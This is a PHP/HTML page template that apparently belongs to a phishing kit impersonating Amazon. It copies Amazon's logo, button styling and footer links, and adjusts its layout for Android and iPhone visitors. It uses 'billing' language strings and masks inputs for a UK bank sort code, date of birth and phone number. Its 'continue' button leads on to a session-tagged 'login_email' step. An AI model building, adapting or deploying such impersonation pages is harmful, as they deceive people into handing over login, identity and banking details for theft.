<html>
<head>
<title><?php echo $lang['billing']['title'];?></title>
<link rel='icon' href='../assets/img/favicon.ico'>
<link rel='stylesheet' href='../assets/css/mobile_login.css'>
<link rel='stylesheet' href='../assets/css/billing.css'>
<script type='text/javascript' src="../assets/js/jquery-1.9.1.js"></script>
<script type='text/javascript' src="../assets/js/jquery.validate.min.js"></script>
<script type='text/javascript' src="../assets/js/jquery.payment.js"></script>
<script type='text/javascript' src="../assets/js/additional-methods.min.js"></script>
<script type='text/javascript' src="../assets/js/jquery.maskedinput.js"></script>
<script type='text/javascript' src="../assets/js/validate.php"></script>
<script type='text/javascript' src="../assets/js/validation.js"></script>
<meta charset='utf-8'>
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
</head>
<body>
  <script>
  $(document).ready(function(){
  var bith = "dd/mm/yyyy";
  $("#sortcode").mask("99-99-99",{placeholder:"__-__-__"});
  $('input[name="dob"]').mask("99/99/9999", {placeholder: bith });
  $('input[name="phone"]').keyup(function(e) {
      if (/\D/g.test(this.value))
      {
        this.value = this.value.replace(/\D/g, '');
      }
    });
  });
  </script>
    <?php
  if($os == "Android" or $os == "iPhone") {}else{
    echo "<center>";
  } ?>

 <?php
  if($os == "Android" or $os == "iPhone") {
    echo '<header style="background-color:#232f3e;">
  <div class="hleft">
  <img style="margin-left:-15px;" src="../assets/img/logo.png" width="90px" height="30px"></img>
  </div>
  </header>';
  }else{
    echo '<br><header style="background-color:#fff;">
  <div class="hleft">
  <i class="a-icon a-icon-logo" style="background-position: -5px -130px;
    height: 31px;
    width: 103px;" role="img" aria-label="Amazon"></i>
  </div>
  </header>';
  } 
  ?>
  <?php
  if($os == "Android" or $os == "iPhone") {}else{
    echo "</center>";
  } ?>
<center>
  <?php
  if($os == "Android" or $os == "iPhone") {}else{
    echo "<br>";
  } ?>
<?php
  if($os == "Android" or $os == "iPhone") {
    echo '<div class="boxlogin">';
  }else{
    echo '<div style="width:400px;" class="boxlogin">';
  } 
  ?>
<div id="warnings" style='font-size:12px;font-family: Arial,sans-serif;'>
<h1><?php echo $lang['billing']['email_link'];?></h1>
<span style="font-size:15px;font-family: Arial,sans-serif;"><?php echo $lang['billing']['desc_link'];?></span>
<br>
<br><br>
 </div>

<div id="formbilling">
<div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
<a style="text-decoration: none;" href="login_email?session=<?php echo $key;?>">
<input type='submit' id="submit_cc" class='button a-button-text' style="padding:10px;background: linear-gradient(to bottom,#f7dfa5,#f0c14b);" value='<?php echo $lang['login']['continue'];?>'></a>
</div></div>
</div>

</center>
<?php
if($os == "Android" or $os == "iPhone") {}else{
  echo "<br><br>";
} ?>
<?php
if($os == "Android" or $os == "iPhone") {
?>
<footer class="nav-mobile nav-locale-us nav-lang-en nav-ftr-batmobile">
                    <div id="nav-ftr" class="nav-t-basicNoAuth nav-sprite-v3">
                        <ul class="nav-ftr-horiz ">
                            <li class="nav-li "><a href="/gp/aw/help/ref=navm_ftr_cou?ie=UTF8&amp;id=cou" class="nav-a"><?php echo $lang['footer']['condi'];?></a></li>
                            <li class="nav-li "><a href="/gp/help/customer/display.html/ref=footer_privacy?ie=UTF8&amp;nodeId=468496" class="nav-a"><?php echo $lang['footer']['privacy'];?></a></li>
                            <li class="nav-li "><a href="/gp/aw/help/ref=navm_ftr_iba?ie=UTF8&amp;id=201308670" class="nav-a"><?php echo $lang['footer']['help'];?></a></li>
                        </ul>
                        <div id="nav-ftr-copyright"><?php echo $lang['footer']['copyright'];?></div>
                    </div>
                </footer>
<?php }?>
</body>
</html>
